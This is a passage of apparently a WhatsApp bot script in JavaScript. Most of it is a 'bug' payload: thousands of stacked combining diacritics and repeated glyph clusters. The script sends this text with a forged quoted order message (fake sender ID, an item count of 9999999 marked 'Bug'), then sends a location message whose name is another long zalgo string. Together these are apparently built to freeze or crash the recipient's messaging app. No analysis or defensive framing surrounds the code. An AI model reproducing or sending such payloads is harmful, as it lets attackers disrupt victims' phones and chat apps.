๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊๊ࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤࣤ์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์์๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋๋ືືືືືືືືືືືືືືືືືືືືືືືຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶຶ᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴᪴MythicXbot*৭99**ঔৣ͜͡҉*MythicX🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.జ్ఞా🎩ཽꦿ.జ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿజ్ఞా.🎩ཽꦿ.`, text, {
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `kurzxd`,
    orderTitle: `combine`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logobot.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͋̓